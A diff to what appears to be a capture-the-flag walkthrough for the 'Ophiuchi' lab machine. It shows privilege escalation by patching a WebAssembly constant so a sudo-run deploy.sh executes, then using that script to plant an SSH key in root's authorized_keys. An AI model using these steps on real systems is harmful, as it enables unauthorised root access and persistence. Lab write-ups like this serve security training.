@@ -78,7 +78,6 @@ We make our working directory in tmp and copy over the main.wasm file.
 
 `cd tmp
 mkdir work && cd work
-
 cp /opt/wasm-functions/main.wasm ./`
 
 Writing our own deploy echoing the id of the user gives us the error 'Not ready to deploy'. So the value of f is not 1, which is read from the wasm file.
@@ -99,14 +98,12 @@ Here we see that the value of f is a constant 0, we change that to 1, our requir
   
 `[-]    i32.const 0)
 [+]    i32.const 1)  
-
 wat2wasm main.wat
 scp main.wasm admin@ophiuchi.htb:/tmp/work`
 
 Now, we run the sudo command again. And this time we get command execution as root. Then, we get our id_rsa.pub using ssh-keygen and paste it to the authorized_keys file at /root/.ssh/ using the deploy.sh file to be able to SSH into the machine as root.
 
 `#!/bin/sh
-
 echo $(id)
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABA***********************************************************************************************************************************************
 ***************************************************************************************************************************************************************************************
